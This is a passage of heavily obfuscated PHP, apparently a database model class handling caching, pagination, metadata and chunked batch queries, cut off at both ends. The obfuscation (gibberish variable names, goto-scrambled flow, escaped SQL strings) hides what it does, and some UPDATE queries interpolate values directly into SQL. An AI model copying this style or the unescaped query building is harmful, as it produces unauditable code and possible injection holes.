(!$this->checkDataAutoHas($DºÀ†”ö´ñ[345])) { return; } $this->dataBeforeFilter($dš¿¦ß, $DºÀ†”ö´ñ[345]); } protected function _afterSelect(&$D£±Òïù†·, $a½Ò­‰Íç¢) { if (!is_array($D£±Òïù†·)) { return; } if (!$this->checkDataAutoHas($_SERVER[”Ì÷ñ­î¸][346])) { return; } foreach ($D£±Òïù†· as &$A×ÇÊ¨À™ö) { $this->dataAfterFilter($A×ÇÊ¨À™ö); } } protected function _afterFind(&$fÚâíÌÁ¸¯, $bÄ¤Ú¨İ®©) { if (!is_array($fÚâíÌÁ¸¯)) { return; } if (!$this->checkDataAutoHas($_SERVER[”Ì÷ñ­î¸][346])) { return; } $this->dataAfterFilter($fÚâíÌÁ¸¯); } public function setAutoIncrement($C‰·ŒÇ´Œ) { $aöÉƒ§ä­ß = array($this->getPk() => $C‰·ŒÇ´Œ); $ağ«£±îšİ = $this->data($aöÉƒ§ä­ß)->add(); if ($ağ«£±îšİ) { $this->delete($ağ«£±îšİ); } } public function getAutoIncrement() { $a¹ºöˆƒÙŒ = $this->getTableName(); $DÉÆŠá™Ø³ = $this->max($this->getPk()); $eÏ¦Üâ˜­Á = $this->query("\163\150\157\x77\40\164\x61\x62\x6c\145\40\x73\x74\x61\164\165\x73\x20\x77\150\145\x72\145\40\116\x61\x6d\145\75\47{$a¹ºöˆƒÙŒ}\47"); $b¸†¾Ü•’ˆ = $eÏ¦Üâ˜­Á[0][$_SERVER[”Ì÷ñ­î¸][347]]; $c‡Ôù†§Œ = max($DÉÆŠá™Ø³, $b¸†¾Ü•’ˆ); return $c‡Ôù†§Œ; } protected function _callBefore($D°³‰¾Äò, $eáé«–Şîß) { return $this->cacheCallCheck($D°³‰¾Äò, $eáé«–Şîß, !1); } protected function _callAfter($CÚƒ’‚¦¶Ù, $BÌÌ„„¾¨ø) { return $this->cacheCallCheck($CÚƒ’‚¦¶Ù, $BÌÌ„„¾¨ø, !0); } protected function cacheFunctionAlias($dÛ¼Áä§íŒ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b¬Â¡¯µ‡„, $C¤ÉÂë“•ñ, $eÒ¬°ÑÆ‘‘ = false) { $Dßßò¥Ú• = $this->cacheFunctionAlias($C¤ÉÂë“•ñ); if (!$Dßßò¥Ú•) { return; } foreach ($Dßßò¥Ú• as $dÚ°À‚çˆ => $a ›Ï—ñè) { $eñö‹¿¯Ÿ® = $a ›Ï—ñè[0]; $dæÏæÖ½êé = explode($_SERVER[”Ì÷ñ­î¸][47], $a ›Ï—ñè[1]); if ($b¬Â¡¯µ‡„ == $dÚ°À‚çˆ) { return $this->cacheFunctionGet($dÚ°À‚çˆ, $eñö‹¿¯Ÿ®); } if ($eÒ¬°ÑÆ‘‘ && in_array($b¬Â¡¯µ‡„, $dæÏæÖ½êé)) { $this->cacheFunctionClear($dÚ°À‚çˆ, $eñö‹¿¯Ÿ®); } } } public function cacheFunctionGet($AÑÛØÔ‡, $f¦½ÊËí“°) { $Fàä‰óÌÒ = $this->cacheKeyMake($AÑÛØÔ‡, $f¦½ÊËí“°); $cˆÙ¹ôÓ¡ = Cache::get($Fàä‰óÌÒ); if (!is_array($cˆÙ¹ôÓ¡)) { $cˆÙ¹ôÓ¡ = call_user_func_array(array($this, $AÑÛØÔ‡), array($f¦½ÊËí“°, !0)); Cache::set($Fàä‰óÌÒ, $cˆÙ¹ôÓ¡); } return $cˆÙ¹ôÓ¡; } public function cacheFunctionClear($Aİ‹×ÙŸ¸©, $dƒßÆ©¦) { $f ¼Æé™‘Î = $dƒßÆ©¦; if (!is_array($dƒßÆ©¦)) { $f ¼Æé™‘Î = array($dƒßÆ©¦); } foreach ($f ¼Æé™‘Î as $f°»¯È“ù) { $Cµ³éˆì˜ = $this->cacheKeyMake($Aİ‹×ÙŸ¸©, $f°»¯È“ù); Cache::remove($Cµ³éˆì˜); } } private function cacheKeyMake($DøÃà£Şóç, $Bîâßˆ¦Š˜) { $Ešœ‚«ƒˆª =& $_SERVER[”Ì÷ñ­î¸]; return get_class($this) . $Ešœ‚«ƒˆª[70] . $DøÃà£Şóç . $Ešœ‚«ƒˆª[348] . $Bîâßˆ¦Š˜; } protected function selectPage($A£å®©Ï‚  = 200, $dËĞ‡Ù®·õ = 1) { goto aÈñÈßÃ¹ï; eœ£ŒÙ±è¹: $B—š·…ãÕ = $F¹ÚïÙâì; $B—š·…ãÕ[$FŠÆ”ôè’õ[350]] = array(); $this->optionsValue($B—š·…ãÕ); goto C‘‡Â¢±¤Â; a¡‡ÇÂÂ†: $this->optionsValue($F¹ÚïÙâì); $Eµ­î‘‚Ñ = $this->page($dËĞ‡Ù®·õ, $A£å®©Ï‚ )->select(); $Eµ­î‘‚Ñ = is_array($Eµ­î‘‚Ñ) ? $Eµ­î‘‚Ñ : array(); goto a©ËÍ‹ó·; C‘‡Â¢±¤Â: $E“¾º¢é÷Ì = intval($this->count()); $A£å®©Ï‚  = intval($A£å®©Ï‚ ); $A£å®©Ï‚  = $A£å®©Ï‚  <= 5 ? 5 : ($A£å®©Ï‚  >= $c¶‚áÃ‡Èª ? $c¶‚áÃ‡Èª : $A£å®©Ï‚ ); goto eØ•¦ƒì›; eØ•¦ƒì›: $F…‹Ş°ê»Ä = ceil($E“¾º¢é÷Ì / $A£å®©Ï‚ ); $dËĞ‡Ù®·õ = intval(isset($in[$FŠÆ”ôè’õ[340]]) ? $in[$FŠÆ”ôè’õ[340]] : $dËĞ‡Ù®·õ); $dËĞ‡Ù®·õ = $dËĞ‡Ù®·õ <= 1 ? 1 : ($dËĞ‡Ù®·õ >= $F…‹Ş°ê»Ä ? $F…‹Ş°ê»Ä : $dËĞ‡Ù®·õ); goto a¡‡ÇÂÂ†; a©ËÍ‹ó·: if ($F…‹Ş°ê»Ä == 1) { $E“¾º¢é÷Ì = count($Eµ­î‘‚Ñ); } $EîÍ‘Â¦Åì = array($FŠÆ”ôè’õ[351] => array($FŠÆ”ôè’õ[352] => $E“¾º¢é÷Ì, $FŠÆ”ôè’õ[349] => $A£å®©Ï‚ , $FŠÆ”ôè’õ[340] => $dËĞ‡Ù®·õ, $FŠÆ”ôè’õ[353] => $F…‹Ş°ê»Ä), $FŠÆ”ôè’õ[354] => $Eµ­î‘‚Ñ ? $Eµ­î‘‚Ñ : array()); return $EîÍ‘Â¦Åì; goto b……¥Â©‡®; aÈñÈßÃ¹ï: $FŠÆ”ôè’õ =& $_SERVER[”Ì÷ñ­î¸]; global $in; $F¹ÚïÙâì = $this->optionsValue(); goto eâ¶ÇÑÁÛ; eâ¶ÇÑÁÛ: $c¶‚áÃ‡Èª = 4000; $A£å®©Ï‚  = isset($in[$FŠÆ”ôè’õ[349]]) ? $in[$FŠÆ”ôè’õ[349]] : $A£å®©Ï‚ ; if ($A£å®©Ï‚  === -1) { unset($in[$FŠÆ”ôè’õ[349]]); $c¶‚áÃ‡Èª = 100000000; $A£å®©Ï‚  = $c¶‚áÃ‡Èª; } goto eœ£ŒÙ±è¹; b……¥Â©‡®: } protected function checkLength($AÖò‹¼Õò, $d¢¡÷Çù‘Ä = 0, $BÏ±‚Ü¢ø = '') { $C´â˜¯”¥ =& $_SERVER[”Ì÷ñ­î¸]; $d¢¡÷Çù‘Ä = $d¢¡÷Çù‘Ä ? $d¢¡÷Çù‘Ä : 65536; if (!$AÖò‹¼Õò || strlen($AÖò‹¼Õò) < $d¢¡÷Çù‘Ä) { return; } $BÏ±‚Ü¢ø = $BÏ±‚Ü¢ø ? $BÏ±‚Ü¢ø . $C´â˜¯”¥[67] : $C´â˜¯”¥[33]; show_json($BÏ±‚Ü¢ø . LNG($C´â˜¯”¥[355]) . "\50{$d¢¡÷Çù‘Ä}\51", !1); } protected function metaSet($Dò•¶Û÷²Ò, $Fï÷„™›ª = null, $dÎ“ÅÍŸ× = null) { goto D¸­Ìƒõ…; aÔ¡îôÑÁƒ: if (is_null($Fï÷„™›ª)) { return $Dù„òÓãÇ->where(array($a¿¸í‘‚¼¿ => $Dò•¶Û÷²Ò))->delete(); } if (is_null($dÎ“ÅÍŸ×)) { return $Dù„òÓãÇ->where($AŸ¶Ÿ¿—‚)->delete(); } $Dç‹…¸ãÒª = is_array($Fï÷„™›ª) ? $Fï÷„™›ª : array(); goto c½£°¸¡¶¬; c½£°¸¡¶¬: if (is_string($Fï÷„™›ª)) { $Dç‹…¸ãÒª[$Fï÷„™›ª] = $dÎ“ÅÍŸ×; } $AÃÌ´Í¥ùò = array(); foreach ($Dç‹…¸ãÒª as $F½ğ¿Çİ¨ö => $d×²‹’ï) { $this->checkLength($d×²‹’ï, !1, $f« ¨ÆÍšÙ . $eê”¹‘Áôë[4] . $F½ğ¿Çİ¨ö); $AÃÌ´Í¥ùò[] = array($a¿¸í‘‚¼¿ => $Dò•¶Û÷²Ò, $eê”¹‘Áôë[89] => $F½ğ¿Çİ¨ö, $eê”¹‘Áôë[359] => $d×²‹’ï); } goto Eùš¹»Œ¥ñ; Aãåâñ†Œƒ: $f« ¨ÆÍšÙ = $this->tableMeta[$eê”¹‘Áôë[357]]; $Dù„òÓãÇ = Model($f« ¨ÆÍšÙ); $AŸ¶Ÿ¿—‚ = array($a¿¸í‘‚¼¿ => $Dò•¶Û÷²Ò, $eê”¹‘Áôë[358] => $Fï÷„™›ª); goto aÔ¡îôÑÁƒ; D¸­Ìƒõ…: $eê”¹‘Áôë =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->tableMeta) { return !1; } $a¿¸í‘‚¼¿ = $this->tableMeta[$eê”¹‘Áôë[356]]; goto Aãåâñ†Œƒ; Eùš¹»Œ¥ñ: $Dù„òÓãÇ->where(array($a¿¸í‘‚¼¿ => $Dò•¶Û÷²Ò))->addAll($AÃÌ´Í¥ùò, array(), !0); return !0; goto E†èà«ìî; E†èà«ìî: } public function metaGet($DÔÎÀ¿ô å) { goto c˜èéì‡µ; D¥¥Ü£“»Í: $fÄß¢­Ğ¿¦ = Model($this->tableMeta[$A¡Ü›¾òÎ“[357]]); $CŒ‘ÀÕê×ù = array($CßÑ‚‚¦¡— => $DÔÎÀ¿ô å); $fâ•æ¿î†Ê = $fÄß¢­Ğ¿¦->field($A¡Ü›¾òÎ“[360])->where($CŒ‘ÀÕê×ù)->select(); goto EËá†‡¬¹; EËá†‡¬¹: $fâ•æ¿î†Ê = array_to_keyvalue($fâ•æ¿î†Ê, $A¡Ü›¾òÎ“[89], $A¡Ü›¾òÎ“[359]); return $fâ•æ¿î†Ê; goto B¯Ø–ƒë„ä; c˜èéì‡µ: $A¡Ü›¾òÎ“ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->tableMeta) { return array(); } $CßÑ‚‚¦¡— = $this->tableMeta[$A¡Ü›¾òÎ“[356]]; goto D¥¥Ü£“»Í; B¯Ø–ƒë„ä: } private function checkDataAutoHas($C…Â™Ì•ß‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $CÍÁ¯Ï¢Û ) { if (in_array($C…Â™Ì•ß‚, explode($_SERVER[”Ì÷ñ­î¸][47], $CÍÁ¯Ï¢Û [2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$f˜äùÂÇÇ, $F³Ùï¾ŸÂ) { $a¶íÙÈâØó =& $_SERVER[”Ì÷ñ­î¸]; foreach ($this->dataAuto as $Fó¨†Ê›‹­) { $e‰ÚéŠ÷…ó = $Fó¨†Ê›‹­[0]; if (!in_array($F³Ùï¾ŸÂ, explode($a¶íÙÈâØó[47], $Fó¨†Ê›‹­[2]))) { continue; } switch (trim($Fó¨†Ê›‹­[3])) { case $a¶íÙÈâØó[309]: case $a¶íÙÈâØó[310]: $D–¯£¶—› = $Fó¨†Ê›‹­[1]; $f’ ñ¹á = isset($Fó¨†Ê›‹­[4]) ? (array) $Fó¨†Ê›‹­[4] : array(); if ($D–¯£¶—› == $a¶íÙÈâØó[190] && array_key_exists($e‰ÚéŠ÷…ó, $f˜äùÂÇÇ)) { if (!$f˜äùÂÇÇ[$e‰ÚéŠ÷…ó]) { unset($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó]); } break; } if (isset($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó])) { array_unshift($f’ ñ¹á, $f˜äùÂÇÇ[$e‰ÚéŠ÷…ó]); } if ($a¶íÙÈâØó[309] == $Fó¨†Ê›‹­[3]) { $f˜äùÂÇÇ[$e‰ÚéŠ÷…ó] = call_user_func_array($D–¯£¶—›, $f’ ñ¹á); } else { $f˜äùÂÇÇ[$e‰ÚéŠ÷…ó] = call_user_func_array(array(&$this, $D–¯£¶—›), $f’ ñ¹á); } break; case $a¶íÙÈâØó[261]: $f˜äùÂÇÇ[$e‰ÚéŠ÷…ó] = $f˜äùÂÇÇ[$Fó¨†Ê›‹­[1]]; break; case $a¶íÙÈâØó[282]: if (isset($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó]) && !is_string($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó])) { $f˜äùÂÇÇ[$e‰ÚéŠ÷…ó] = json_encode_force($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó]); } break; case $a¶íÙÈâØó[311]: if ($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó] === $a¶íÙÈâØó[33]) { unset($f˜äùÂÇÇ[$e‰ÚéŠ÷…ó]); } break; case $a¶íÙÈâØó[312]: $f˜äùÂÇÇ[$e‰ÚéŠ÷…ó] = $Fó¨†Ê›‹­[1]; default: break; } } if ($F³Ùï¾ŸÂ == $a¶íÙÈâØó[344]) { $EÚ£Çé = strtolower($this->db->getDbType()); if (strpos($EÚ£Çé, $a¶íÙÈâØó[9]) !== 0) { return; } $C”àğ…£¼“ = $this->field(!0)->fields; $aäÀ«“öÇ = $C”àğ…£¼“[$a¶íÙÈâØó[240]]; if (isset($C”àğ…£¼“[$a¶íÙÈâØó[239]])) { unset($aäÀ«“öÇ[$C”àğ…£¼“[$a¶íÙÈâØó[239]]]); } foreach ($aäÀ«“öÇ as $d¯¢ÍÄ«‰ => $F³Ùï¾ŸÂ) { if (!isset($f˜äùÂÇÇ[$d¯¢ÍÄ«‰])) { $f˜äùÂÇÇ[$d¯¢ÍÄ«‰] = $a¶íÙÈâØó[33]; } } } } private function dataAfterFilter(&$AšÕ«Ò¥³) { $dÜ—Ø¥ŠŸ =& $_SERVER[”Ì÷ñ­î¸]; foreach ($this->dataAuto as $d‘¼Èé¯¾¦) { $BñßØˆ¬« = $d‘¼Èé¯¾¦[0]; if (!in_array($dÜ—Ø¥ŠŸ[346], explode($dÜ—Ø¥ŠŸ[47], $d‘¼Èé¯¾¦[2]))) { continue; } if (!isset($AšÕ«Ò¥³[$BñßØˆ¬«])) { continue; } switch (trim($d‘¼Èé¯¾¦[3])) { case $dÜ—Ø¥ŠŸ[309]: case $dÜ—Ø¥ŠŸ[310]: $b„¡¨¾É¥ = isset($d‘¼Èé¯¾¦[4]) ? (array) $d‘¼Èé¯¾¦[4] : array(); array_unshift($b„¡¨¾É¥, $AšÕ«Ò¥³[$BñßØˆ¬«]); if ($dÜ—Ø¥ŠŸ[309] == $d‘¼Èé¯¾¦[3]) { $AšÕ«Ò¥³[$BñßØˆ¬«] = call_user_func_array($d‘¼Èé¯¾¦[1], $b„¡¨¾É¥); } else { $AšÕ«Ò¥³[$BñßØˆ¬«] = call_user_func_array(array(&$this, $d‘¼Èé¯¾¦[1]), $b„¡¨¾É¥); } break; case $dÜ—Ø¥ŠŸ[261]: $AšÕ«Ò¥³[$BñßØˆ¬«] = $AšÕ«Ò¥³[$d‘¼Èé¯¾¦[1]]; break; case $dÜ—Ø¥ŠŸ[282]: $CÉŸ½‰Æ«± = $AšÕ«Ò¥³[$BñßØˆ¬«]; $AšÕ«Ò¥³[$BñßØˆ¬«] = json_decode($CÉŸ½‰Æ«±, !0); if (is_null($AšÕ«Ò¥³[$BñßØˆ¬«])) { $AšÕ«Ò¥³[$BñßØˆ¬«] = $CÉŸ½‰Æ«±; } break; case $dÜ—Ø¥ŠŸ[311]: if ($AšÕ«Ò¥³[$BñßØˆ¬«] === $dÜ—Ø¥ŠŸ[33]) { unset($AšÕ«Ò¥³[$BñßØˆ¬«]); } break; case $dÜ—Ø¥ŠŸ[312]: $AšÕ«Ò¥³[$BñßØˆ¬«] = $d‘¼Èé¯¾¦[1]; default: break; } } } public function saveAll($f¤¤”ç…‰) { goto Aöğ¦ß›ª ; BÃè«¬„æ: $f¤¤”ç…‰ = is_array($f¤¤”ç…‰) ? $f¤¤”ç…‰ : array(); $aÚƒÏÑ„Ì‚ = $b£ªÇ–®æÏ[361]; $b§®Õ‘øŠØ = 0; goto B×ñ‹´ óÈ; Aöğ¦ß›ª : $b£ªÇ–®æÏ =& $_SERVER[”Ì÷ñ­î¸]; $bí¯³¿Ü˜ñ = $this->tablePrefix . $this->tableName; $F’ŠÏİœ²» = self::SQL_WHERE_IN_CHUNK; goto BÃè«¬„æ; Bñ¨‘ˆìĞõ: $this->chunkEventSet(); goto dØòÃîÚÅ¢; B×ñ‹´ óÈ: $F‹Âœ˜¿Ş‡ = array(); $CÃ°Ã‰á¥ = count($f¤¤”ç…‰); for ($C‰°ªš‡¸õ = 0; $C‰°ªš‡¸õ < $CÃ°Ã‰á¥; $C‰°ªš‡¸õ++) { $A‘­ÂŸÁ² = $f¤¤”ç…‰[$C‰°ªš‡¸õ]; if (!is_array($A‘­ÂŸÁ²) || count($A‘­ÂŸÁ²) != 4) { continue; } $Eªˆ¾¯Ï·ƒ = "\x55\x50\x44\101\x54\105\x20{$bí¯³¿Ü˜ñ}\x20\x53\105\124\40{$A‘­ÂŸÁ²[2]}\40\75\x20\103\x41\x53\x45\40{$A‘­ÂŸÁ²[0]}\x20\12"; if ($b§®Õ‘øŠØ == 0) { $aÚƒÏÑ„Ì‚ = $Eªˆ¾¯Ï·ƒ; } $F‹Âœ˜¿Ş‡[] = $b£ªÇ–®æÏ[113] . $A‘­ÂŸÁ²[1] . $b£ªÇ–®æÏ[113]; $b§®Õ‘øŠØ++; $aÚƒÏÑ„Ì‚ .= "\x20\x57\110\105\x4e\40\x27{$A‘­ÂŸÁ²[1]}\47\40\x54\110\x45\116\40\47{$A‘­ÂŸÁ²[3]}\47\x20\xa"; if ($b§®Õ‘øŠØ == $F’ŠÏİœ²» || $C‰°ªš‡¸õ == $CÃ°Ã‰á¥ - 1) { goto a¡ïÓ•Œ²æ; CÛÎŞ‡öù¡: $b§®Õ‘øŠØ = 0; $aÚƒÏÑ„Ì‚ = $Eªˆ¾¯Ï·ƒ; $this->chunkEventCheck(count($F‹Âœ˜¿Ş‡)); goto CË–…Å½äİ; a¡ïÓ•Œ²æ: $FÃ§â²†Ğ¿ = implode($b£ªÇ–®æÏ[47], $F‹Âœ˜¿Ş‡); $aÚƒÏÑ„Ì‚ .= "\x20\x45\116\x44\x20\x20\127\x48\x45\122\x45\40{$A‘­ÂŸÁ²[0]}\40\111\x4e\x20\x28{$FÃ§â²†Ğ¿}\51\40"; $this->execute($aÚƒÏÑ„Ì‚); goto CÛÎŞ‡öù¡; CË–…Å½äİ: $F‹Âœ˜¿Ş‡ = array(); goto A¸ŠÒñ«¶ì; A¸ŠÒñ«¶ì: } } goto Bñ¨‘ˆìĞõ; dØòÃîÚÅ¢: } public function saveAllEach($d“µ†ø“æ‚) { $b—ó‚±â«¡ =& $_SERVER[”Ì÷ñ­î¸]; $aà¢˜ØôÖ = $this->tablePrefix . $this->tableName; foreach ($d“µ†ø“æ‚ as $c³ôÛÄø©) { if (!is_array($c³ôÛÄø©) || count($c³ôÛÄø©) != 4) { continue; } $b¶¨ºéö¡î = $c³ôÛÄø©[0] . $b—ó‚±â«¡[362] . $c³ôÛÄø©[1] . $b—ó‚±â«¡[113]; $AÒÏšáÊŒå = $c³ôÛÄø©[2] . $b—ó‚±â«¡[362] . $c³ôÛÄø©[3] . $b—ó‚±â«¡[113]; $dâ¾ç‹¾ñ = "\165\x70\x64\141\164\x65\x20{$aà¢˜ØôÖ}\x20\x73\x65\x74\40{$AÒÏšáÊŒå}\x20\167\x68\x65\x72\x65\40{$b¶¨ºéö¡î}\73"; $this->execute($dâ¾ç‹¾ñ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($EŒ‹áñîÉÑ = false, $b–¨áÊ²ÉÌ = false) { $this->_chunkEvent = $EŒ‹áñîÉÑ; $this->_chunkEventParam = $b–¨áÊ²ÉÌ; } private function chunkEventCheck($bÉ¼—ÁÍ´í) { if (!$this->_chunkEvent) { return; } $CĞİœ‰„ç  = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $CĞİœ‰„ç [$_SERVER[”Ì÷ñ­î¸][363]] = $bÉ¼—ÁÍ´í; Hook::trigger($this->_chunkEvent, $CĞİœ‰„ç ); } public function addAll($aàÙ §‘¡â, $aÕ°Šã˜‰ = array(), $bÂ±ÆùÎ§¡ = false) { goto bªÖ¿’‹ß; B¬óÀ“÷Ñ½: if (empty($aàÙ §‘¡â)) { $this->error = think_lang($eòª³Ñš·[259]); return !1; } $aÕ°Šã˜‰ = $this->_parseOptions($aÕ°Šã˜‰); foreach ($aàÙ §‘¡â as $fğõ²‚Û¿§ => $BÒì˜‡•‡†) { $aàÙ §‘¡â[$fğõ²‚Û¿§] = $this->_facade($BÒì˜‡•‡†); $this->_beforeInsert($aàÙ §‘¡â[$fğõ²‚Û¿§], $aÕ°Šã˜‰); } goto C¥öĞ„ŠŸÂ; bªÖ¿’‹ß: $eòª³Ñš· =& $_SERVER[”Ì÷ñ­î¸]; ignore_timeout(); $e²˜¸øëŠ˜ = self::SQL_WHERE_IN_CHUNK; goto B¬óÀ“÷Ñ½; C¥öĞ„ŠŸÂ: if (method_exists($this->db, $eòª³Ñš·[260])) { for ($bÕÊñÅ÷¡ù = 0; $bÕÊñÅ÷¡ù < count($aàÙ §‘¡â); $bÕÊñÅ÷¡ù += $e²˜¸øëŠ˜) { $cãÅŒŠ±‡´ = array_slice($aàÙ §‘¡â, $bÕÊñÅ÷¡ù, $e²˜¸øëŠ˜); if (!is_array($cãÅŒŠ±‡´) || count($cãÅŒŠ±‡´) == 0) { break; } $aŸ·«”Õ™± = $this->db->insertAll($cãÅŒŠ±‡´, $aÕ°Šã˜‰, $bÂ±ÆùÎ§¡); $this->chunkEventCheck(count($cãÅŒŠ±‡´)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aàÙ §‘¡â as $fğõ²‚Û¿§ => $BÒì˜‡•‡†) { $aŸ·«”Õ™± = $this->db->insert($BÒì˜‡•‡†, $aÕ°Šã˜‰, $bÂ±ÆùÎ§¡); } $this->commit(); } if (!1 !== $aŸ·«”Õ™±) { $aƒ¬Šœ¹óÌ = $this->getLastInsID(); if ($aƒ¬Šœ¹óÌ) { return $aƒ¬Šœ¹óÌ; } } return $aŸ·«”Õ™±; goto bè‘‹²¯ŒÆ; bè‘‹²¯ŒÆ: } public function save($B¨à…˜ÛÂ— = '', $cÂÇƒ—“¥Ç = array()) { goto AÖèĞÉàÜ; AÖèĞÉàÜ: $Fß³ø’´÷ó =& $_SERVER[”Ì÷ñ­î¸]; $f‘®ªÛö‚‚ = self::SQL_WHERE_IN_CHUNK; $C„Ìˆ‹  = $this->optionsValue(); goto DÛîî˜Œ§; DÛîî˜Œ§: $C‘Ç¡Òª·¢ = $this->findWhereField($C„Ìˆ‹ ); if (!$C‘Ç¡Òª·¢) { return parent::save($B¨à…˜ÛÂ—, $cÂÇƒ—“¥Ç); } $EÙìó‹Ö£ = 0; goto a£¦ŒÌ›ª; FùŸì÷‹Ö: for ($f™ÄÅ÷£§Œ = 0; $f™ÄÅ÷£§Œ < $Eç¶ËŞø•¶; $f™ÄÅ÷£§Œ += $f‘®ªÛö‚‚) { $dğ³§¢¡¼Á = array_slice($câì§¥”, $f™ÄÅ÷£§Œ, $f‘®ªÛö‚‚); if (!is_array($dğ³§¢¡¼Á) || count($dğ³§¢¡¼Á) == 0) { break; } $C„Ìˆ‹ [$Fß³ø’´÷ó[263]][$C‘Ç¡Òª·¢][1] = $dğ³§¢¡¼Á; $this->optionsValue($C„Ìˆ‹ ); $EÙìó‹Ö£ += parent::save($B¨à…˜ÛÂ—, $cÂÇƒ—“¥Ç); $this->chunkEventCheck(count($dğ³§¢¡¼Á)); } $this->chunkEventSet(); return $EÙìó‹Ö£; goto A‚±­’Ïµ‘; a£¦ŒÌ›ª: $câì§¥” = $C„Ìˆ‹ [$Fß³ø’´÷ó[263]][$C‘Ç¡Òª·¢][1]; $câì§¥” = is_array($câì§¥”) ? $câì§¥” : array(); $Eç¶ËŞø•¶ = count($câì§¥”); goto FùŸì÷‹Ö; A‚±­’Ïµ‘: } public function add($AŒ´®ÀŞÚ® = '', $E×£©…ëÕÅ = array(), $a‘»­‰Ë×ò = false) { if ($this->addTaskStatus && is_array($AŒ´®ÀŞÚ®)) { $this->addTaskData[] = $AŒ´®ÀŞÚ®; return; } return parent::add($AŒ´®ÀŞÚ®, $E×£©…ëÕÅ, $a‘»­‰Ë×ò); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($a‡¶‚£Şš” = array()) { goto f°¢å˜¥Ë­; Dí‰·Å¼É›: $fµâù¢Ó‘ë = is_array($fµâù¢Ó‘ë) ? $fµâù¢Ó‘ë : array(); $Cõƒ¡ŞØ÷ = null; for ($E“´ªÑ›±  = 0; $E“´ªÑ›±  < count($fµâù¢Ó‘ë); $E“´ªÑ›±  += $EİØ‘½¥ˆÜ) { $BñÎ¸¼¹£á = array_slice($fµâù¢Ó‘ë, $E“´ªÑ›± , $EİØ‘½¥ˆÜ); if (!is_array($BñÎ¸¼¹£á) || count($BñÎ¸¼¹£á) == 0) { break; } $BĞÂøğìÀ[$AáŸ‡„¯¨‘[263]][$Fš´·®‘“·][1] = $BñÎ¸¼¹£á; $this->optionsValue($BĞÂøğìÀ); $AÍØ¹²Û»† = parent::select($a‡¶‚£Şš”); if (!$AÍØ¹²Û»†) { continue; } if (is_null($Cõƒ¡ŞØ÷)) { $Cõƒ¡ŞØ÷ = array(); } $Cõƒ¡ŞØ÷ = array_merge($Cõƒ¡ŞØ÷, $AÍØ¹²Û»†); } goto B•£ØŠ‹; B•£ØŠ‹: return $Cõƒ¡ŞØ÷; goto b¾ÅéÏ¯±¡; d·£ÓŒè½: $Fš´·®‘“· = $this->findWhereField($BĞÂøğìÀ); if (!$Fš´·®‘“· || isset($BĞÂøğìÀ[$AáŸ‡„¯¨‘[280]]) || isset($BĞÂøğìÀ[$AáŸ‡„¯¨‘[340]])) { return parent::select($a‡¶‚£Şš”); } $fµâù¢Ó‘ë = $BĞÂøğìÀ[$AáŸ‡„¯¨‘[263]][$Fš´·®‘“·][1]; goto Dí‰·Å¼É›; f°¢å˜¥Ë­: $AáŸ‡„¯¨‘ =& $_SERVER[”Ì÷ñ­î¸]; $EİØ‘½¥ˆÜ = self::SQL_WHERE_IN_CHUNK; $BĞÂøğìÀ = $this->optionsValue(); goto d·£ÓŒè½; b¾ÅéÏ¯±¡: } public function delete($BÛ°îøŠ«‰ = array()) { goto fµìŠãÃÍì; b øÑÁëŞ–: $AŠ’¤™¾’ = $this->findWhereField($ağğÅ¿ŠÀ); if (!$AŠ’¤™¾’) { return parent::delete($BÛ°îøŠ«‰); } $C ´‰çØ¯Ğ = 0; goto d—ªí×Ï™†; fµìŠãÃÍì: $DŒ‰’ª¼© =& $_SERVER[”Ì÷ñ­î¸]; $C¨ò¥ÙÃ¥œ = self::SQL_WHERE_IN_CHUNK; $ağğÅ¿ŠÀ = $this->optionsValue(); goto b øÑÁëŞ–; F§¶ñÏ¢ ø: return $C ´‰çØ¯Ğ; goto EºÑ©Î—‘; d—ªí×Ï™†: $AÏ—­ÔàÈ = $ağğÅ¿ŠÀ[$DŒ‰’ª¼©[263]][$AŠ’¤™¾’][1]; $AÏ—­ÔàÈ = is_array($AÏ—­ÔàÈ) ? $AÏ—­ÔàÈ : array(); for ($A¨¹…Ò®œâ = 0; $A¨¹…Ò®œâ < count($AÏ—­ÔàÈ); $A¨¹…Ò®œâ += $C¨ò¥ÙÃ¥œ) { $bæÅîæáàš = array_slice($AÏ—­ÔàÈ, $A¨¹…Ò®œâ, $C¨ò¥ÙÃ¥œ); if (!is_array($bæÅîæáàš) || count($bæÅîæáàš) == 0) { break; } $ağğÅ¿ŠÀ[$DŒ‰’ª¼©[263]][$AŠ’¤™¾’][1] = $bæÅîæáàš; $this->optionsValue($ağğÅ¿ŠÀ); $C ´‰çØ¯Ğ += parent::delete($BÛ°îøŠ«‰); } goto F§¶ñÏ¢ ø; EºÑ©Î—‘: } private function findWhereField($cƒùø°Œ¼Â) { $BŒêİÒÙ¥œ =& $_SERVER[”Ì÷ñ­î¸]; $b»Õ®£»Ü = self::SQL_WHERE_IN_CHUNK; if (!is_array($cƒùø°Œ¼Â) || !is_array($cƒùø°Œ¼Â[$BŒêİÒÙ¥œ[263]])) { return !1; } foreach ($cƒùø°Œ¼Â[$BŒêİÒÙ¥œ[263]] as $e¦Šİíİ˜¬ => $bØ†ÌËÛ‚) { if (is_array($bØ†ÌËÛ‚) && isset($bØ†ÌËÛ‚[0]) && is_string($bØ†ÌËÛ‚[0]) && strtolower($bØ†ÌËÛ‚[0]) == $BŒêİÒÙ¥œ[7] && is_array($bØ†ÌËÛ‚[1]) && count($bØ†ÌËÛ‚[1]) > $b»Õ®£»Ü) { ignore_timeout(); return $e¦Šİíİ˜¬; } } return 